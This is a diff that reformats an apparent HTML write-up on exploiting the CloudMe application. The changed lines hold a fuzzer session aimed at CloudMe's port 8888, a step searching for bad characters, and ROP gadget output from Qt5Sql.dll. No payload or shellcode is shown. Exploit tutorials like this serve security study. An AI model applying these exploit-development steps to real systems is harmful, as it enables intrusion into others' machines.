@@ -109,7 +109,8 @@ port = 8888  #CloudMe port
 
 def main():
 
-	session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))
+	session = Session(
+      target = Target(connection = SocketConnection(host, port, proto='tcp')))
 
 	s_initialize("CloudMe")	#just giving our session a name
 	s_string("FUZZ") 
@@ -359,9 +360,10 @@ Invalid exception stack at 41414141
 <h3>3. The Bad Characters</h3>
 <p align="justify">At this point, before moving further to exploitation, its time to search for bad characters. First, we will use a hex character generator to generate all the 256 ascii hex characters. A nice hex character generator can be cloned from <a href="https://github.com/cytopia/badchars">here</a>. We can also install badchars in our Kali machine as follows</p>
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 pip3 install badchars
-```
+</pre>
 
 <p align="justify">Then we will generate the hex chars as follows</p>
 
@@ -611,7 +613,7 @@ pentest@pentest-PC MINGW32 ~/Desktop/ROPgadget (master)
 $ python ROPgadget.py --binary "C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll" --only "ret" --depth 5 --badbytes "00"
 Gadgets information
 ============================================================
-0x6d9c1011 : ret
+<span style="color:#ff0000;">0x6d9c1011 : ret</span>
 0x6d9c35b1 : ret 0
 0x6d9cf7e4 : ret 0x10
 0x6d9d782a : ret 0x11b
